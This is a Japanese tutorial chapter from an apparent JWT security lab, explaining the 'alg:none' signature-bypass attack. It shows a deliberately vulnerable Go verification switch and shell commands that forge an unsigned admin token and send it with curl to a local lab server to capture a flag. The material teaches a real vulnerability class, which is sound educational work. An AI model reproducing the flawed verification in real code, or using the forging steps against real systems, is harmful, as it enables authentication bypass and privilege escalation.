# 05. 攻撃1: alg:none偽造

`stage2-jwt-alg-none`を起動したまま進める(4章で起動済みならそのまま)。

## 理論

`cmd/stage2-jwt-alg-none/main.go`の`verifyToken`をもう一度見る。

```go
switch header.Alg {
case "HS256":
    // 署名を検証する
case "none":
    // バグ: 署名部分(parts[2])を完全に無視している
```

JWTの仕様(RFC 7519)には署名なしの`alg:"none"`という値が実在する(デバッグ用途などを想定したもの)。サーバがこれを無条件に許可すると、**攻撃者は署名部分を空文字にしたトークンを、好きなpayloadで作れてしまう**。秘密鍵は一切不要。

これは2015年前後に複数の主要JWTライブラリで実際に見つかった脆弱性クラス。「ライブラリがheaderの`alg`を信じて検証方法を切り替える」という設計そのものが問題であり、対策は8章で見る。

## 攻撃

`tools/forge`はheaderとpayloadを自分で組み立ててトークンを作るツール。秘密鍵を渡さなければ、署名なし(alg:none相当)のトークンを出力する。

```
EXP=$(($(date +%s)+600))
TOKEN=$(go run ./tools/forge \
  -header '{"alg":"none","typ":"JWT"}' \
  -payload "{\"sub\":\"mallory\",\"role\":\"admin\",\"exp\":$EXP}")

echo "$TOKEN"
curl -i --cookie "access_token=$TOKEN" localhost:8080/admin
```

`{"secret":"🚩 welcome, admin"}`が返れば成功。`mallory`というアカウントは`userstore`に存在すらしないのに、管理者権限を得ている。

## 何が起きたか

サーバは「このトークンは自分が発行したものか」を一度も検証していない。JWTの安全性は署名検証の実装だけが支えており、それが抜けると**トークンはただのJSONを装飾しただけの文字列**になる。base64urlはエンコードであって暗号ではない、という3章の話が、ここで攻撃として実感できたはず。
